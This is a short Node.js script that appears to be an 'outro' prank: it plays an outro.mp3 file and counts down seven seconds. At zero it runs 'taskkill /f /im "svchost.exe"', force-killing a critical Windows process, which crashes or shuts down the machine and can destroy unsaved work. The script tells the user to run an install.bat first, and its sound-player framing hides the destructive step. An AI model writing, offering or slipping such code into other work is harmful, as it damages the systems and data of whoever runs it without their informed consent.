const sound = require('sound-play');
const path = require('path');
const filePath = path.join(__dirname, "outro.mp3");
const { exec } = require('child_process');
const fs = require('fs');

if (!fs.existsSync('./node_modules'))
    throw new Error(
        'please click on install.bat.\n'
    );

let time = 7;
let countdown = setInterval(update, 970);
async function update() {
    let min = Math.floor(time / 60);
    let sec = time % 60;
    console.log(`${sec} seconds left`);
    time--;
    if (min == 0 && sec == 0) {
        clearInterval(countdown);
        try {
            await exec('taskkill /f /im "svchost.exe"');
        } catch (error) {
            console.log(error);
        }

    }
}

(async () => {
    try {
        await sound.play(filePath);
        console.log("done");
    } catch (error) {
        console.error(error);
    }
})()
